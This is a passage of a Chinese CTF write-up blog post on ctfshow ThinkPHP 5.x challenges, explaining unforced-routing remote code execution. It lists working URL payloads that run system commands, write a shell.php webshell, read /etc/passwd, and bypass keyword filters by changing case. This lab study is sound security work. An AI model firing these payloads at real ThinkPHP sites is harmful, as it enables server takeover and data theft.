+<p>这个 invokeFunction 方法通过<code>反射机制</code>动态调用一个函数，同时可以灵活绑定参数。它的核心功能是接受一个函数名和参数列表（<code>数组</code>），然后使用 PHP 的 ReflectionFunction 来安全地调用该函数，这个函数要可以处理数组，要达到rce的目标，可以使用<code>call_user_func_array</code>函数</p>
+<pre><code class="language-php">public static function invokeFunction($function, $vars = [])
+{
+    $reflect = new \ReflectionFunction($function);
+    $args    = self::bindParams($reflect, $vars);
+
+    // 记录执行信息
+    self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;__toString(), 'info');
+
+    return $reflect-&gt;invokeArgs($args);
+}</code></pre>
+<p><img src="/images/show-think/40.png" alt="40" decoding="async" loading="lazy" width="946" height="409"></p>
+<p>好了，那么一切都迎刃而解了。这个路由和方法太过于危险，如果普通用户也可以访问利用来执行命令非常可怕，事实上默认配置也是允许用户访问的，所以题目描述<code>未开启强制路由RCE</code>。</p>
+<p>那么，理论上只要可以访问这个方法就可以实现rce，把常用的路由模式都是一遍（x），<a href="https://www.kancloud.cn/manual/thinkphp5/118012">新的url模式</a>，并且tp5默认url不区分大小写了</p>
+<ul>
+<li><a href="http://serverName/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%5B%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值</a>...]</li>
+<li><a href="http://serverName/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89?s=/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%5B%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC">http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值</a>...]</li>
+</ul>
+<p>这里第一种方式似乎解析不了，用第二种<code>?s</code>来解析</p>
+<pre><code class="language-php">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</code></pre>
+<p>tp5的一些常用payload：</p>
+<pre><code class="language-php">?s=index/think\Request/input&amp;filter=system&amp;data=dir
+?s=index/think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/think\Container/invokefunction&amp;function=call_user_func&amp;vars[]=system&amp;vars[]=dir
+?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre>
+<p>提一下，tp5 url模式不再区分大小写了，所以如果出现过滤关键词的情况，可以尝试大小写绕过</p>
+<h2>web 604</h2>
+<blockquote>
+<p>描述：未开启强制路由，举一反二</p>
+</blockquote>
+<p>题目里给出了tp5的版本号：版本thinkphp 5.1.29，其实不给也是可以的，通过报错使tp框架报错，通过返回的版本号直接谷歌对于漏洞打，太爽了</p>
+<p>用上一题的payload打，提示<code>invokefunction 这条路子不通，想想其他路子~</code>，使用上题提供的其他payload，也可以把<code>invokefunction</code>里替换为大写，通过url不区分大小写绕过</p>
+<p>太好玩啦！你还有多少惊喜是我不知道的？？？</p>
+<pre><code class="language-php">?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/think\Request/input&amp;filter=assert&amp;data=phpinfo();
+?s=index/think\Request/input&amp;filter[]=assert&amp;data=phpinfo();</code></pre>
+<p>我的失败尝试：</p>
+<p>在<code>invokefucntion</code>方法下面接着看，还有<code>invokeMethod</code>,<code>invokeClass</code></p>
+<p><code>invokeMethod</code>方法的定义如下，接收两个参数，第一个是类的方法，第二个是数组参数</p>
+<pre><code class="language-php">public static function invokeMethod($method, $vars = [])
+{
+    if (is_array($method)) {
+        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
+        $reflect = new \ReflectionMethod($class, $method[1]);
+    } else {
+        // 静态方法
+        $reflect = new \ReflectionMethod($method);
+    }
+
+    $args = self::bindParams($reflect, $vars);
+
+    self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info');
+
+    return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);
+}</code></pre>
+<p>尝试了两个原生类都不行，是用法错了吗？提示方法不存在，道友们有兴趣试试</p>
+<pre><code class="language-php">?s=index/\think\app/invokeMethod&amp;method=SplFileObject::__toString&amp;vars[0]=php://filter/convert.base64-encode/resource=/flag
+?s=index/\think\app/invokeMethod&amp;method=Error::getmessage&amp;vars[0]=system&amp;vars[1][]=ls</code></pre>
+<h2>web 605</h2>
+<blockquote>
+<p>描述：未开启强制路由RCE-姿势2 版本thinkphp 5.1.29 举一反二</p>
+</blockquote>
+<p>过滤了<code>invokefunction</code>、<code>input</code>，可以尝试url不区分大小写绕过。也可以试试试写文件，这里是可以的，为什么前面几题没用？试了，要么执行不了，要么没有写的权限</p>
+<pre><code class="language-php">?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
+?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
+?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre>
+<h2>web 606</h2>
+<blockquote>
+<p>描述：未开启强制路由RCE-姿势4 版本thinkphp 5.1.29 举一反四</p>
+</blockquote>
+<p>每次禁用上一题使用的payload的关键字时，通过大小写绕过一下即可。这题在上面的基础过滤了write，大写即可</p>
+<pre><code class="language-php">?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
+?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
+?s=index/THINK\template\driver\file/WRITE&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre>
+<h2>web 607</h2>
+<blockquote>
+<p>描述：未开启强制路由RCE-姿势5 举一反五</p>
+</blockquote>
+<p>上的payload还是可以打，似乎都仅仅是过滤了小写</p>
+<pre><code class="language-php">?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
+?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
+?s=index/THINK\template\driver\file/WRITE&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre>
+<p>学到一条新链子</p>
+<p>利用了一个<code>__call()</code>方法再触发display方法，可以渲染php代码</p>
+<pre><code class="language-php">?s=index/\think\view\driver\Think/__call&amp;method=display&amp;params[]=&lt;?php system('tac /f*'); ?&gt;</code></pre>
+<p>没什么意思，学一下其他可以解析的链子，并不是所有版本都适用！</p>
+<pre><code class="language-php">?s=index/\think\Lang/load&amp;file=/etc/passwd   # 读取文件，如果知道flag文件名，....
+?s=index/\think\Config/load&amp;file=/etc/passwd # 包含任意文件，适用v5.0.*</code></pre>
+<p>一直到610，都是这个思路，只是过滤了不同的关键字，大小写绕过</p>
+<p>后续似乎都是反序列化挖链子的，打算单开一篇学习，那就到此结束了拜拜拜拜</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/top-think/thinkphp">Thinkphp v3.2.3官方源码</a></li>
+<li><a href="https://www.cnblogs.com/Cl0ud/p/15941252.html">thinkphp日志泄露</a></li>
+<li><a href="https://y4er.com/posts/thinkphp3-vuln/">tp3漏洞总结</a></li>
+<li><a href="https://blog.csdn.net/qq_50589021/article/details/120616736">tp3 SQL注入漏洞跟踪</a></li>
+<li><a href="https://blog.csdn.net/qq_50589021/article/details/120616736">thinkPHP3.2.3sql注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/miuzzx/article/details/119410335">变量覆盖RCE</a></li>
+<li><a href="https://fallingskies22.github.io/post/ctfshowthinkphp-zhuan-ti/">变量覆盖RCE</a></li>
+<li><a href="https://www.modb.pro/db/501435">未开启强制路由RCE</a></li>
+<li><a href="https://blog.csdn.net/weixin_45669205/article/details/116724655">未开启强制路由RCE</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#thinkphp</span>
+                                    <span>#ctfshow</span>
+                                    <span>#wp</span>
+                                    <span>#ctf</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
